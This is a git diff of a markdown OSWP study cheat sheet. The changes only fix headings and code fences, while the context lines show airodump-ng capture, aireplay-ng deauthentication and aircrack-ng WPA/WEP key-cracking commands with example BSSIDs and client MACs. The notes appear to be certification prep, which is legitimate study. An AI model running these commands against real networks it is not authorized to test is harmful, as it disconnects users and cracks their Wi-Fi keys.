@@ -1,6 +1,6 @@
 # OSWP
 
-## Aircrack-ng 
+## Airmon-ng
 ```
 sudo airmon-ng check
 sudo airmon-ng check kill
@@ -19,6 +19,7 @@ ifconfig
 ```
 sudo airodump-ng [interface] --channel [#] --bssid [BSSID] --essid [ESSID] -w [file.cap]
 sudo airodump-ng wlan0mon --c 2
+```
 |CMD|DESC|
 |-----|-----|
 |-w|output filename| 
@@ -29,7 +30,6 @@ sudo airodump-ng wlan0mon --c 2
 |--ivs| Interval Vectors
 |-R|Regular Expression|
 
-```
 ## Aircrack-ng
 ```
 aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
@@ -53,7 +53,7 @@ sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
 -a|BSSID
 -c|client MAC
 
-### WPA/WPA2-PSK
+## WPA/WPA2-PSK
 ```
 sudo airodump-ng wlan0mon -c 3 --bssid 34:08:04:09:3D:38 -w 1.cap
 sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
@@ -75,7 +75,7 @@ echo ${PINDB["0013F7"]}
 ```
 ## WEP Attack 
 https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
-** Capture packets ** 
+** Must capture packets ** 
 ```
 (( 4 windows ))
 sudo airodump-ng wlan0mon -w output.cap
